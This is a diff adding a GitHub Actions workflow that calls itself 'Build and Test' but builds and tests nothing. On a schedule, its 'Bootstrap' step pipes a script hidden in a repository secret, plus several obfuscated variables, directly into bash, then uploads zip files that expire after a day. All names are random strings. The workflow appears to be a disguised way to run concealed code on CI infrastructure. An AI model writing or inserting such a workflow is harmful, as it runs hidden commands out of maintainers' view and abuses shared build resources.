@@ -1,0 +1,37 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '2 5,11,17,23 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  deploy:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Bootstrap
+        env:
+          jt054: ${{ secrets.jt054 }}
+        run: |
+          printf '%s' "$jt054" | jq -r .lpzuj8574 | /bin/bash
+          echo $qaf8 | jq -r .pqne5633 | /bin/bash
+          echo $qjz27307 | jq -r .teeza2 | /bin/bash
+          echo $e2907 | jq -r .j4505 | /bin/bash
+          printf '%s' "$knlr699" | jq -r .uoesw94007 | /bin/bash
+          echo $srlos48170 | jq -r .cqr4 | /bin/bash
+          printf '%s' "$kgjzf86612" | jq -r .kvqu7 | /bin/bash
+
+      - name: Archive artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: GkNBgxZx
+          path: "*.zip"
+          retention-days: 1
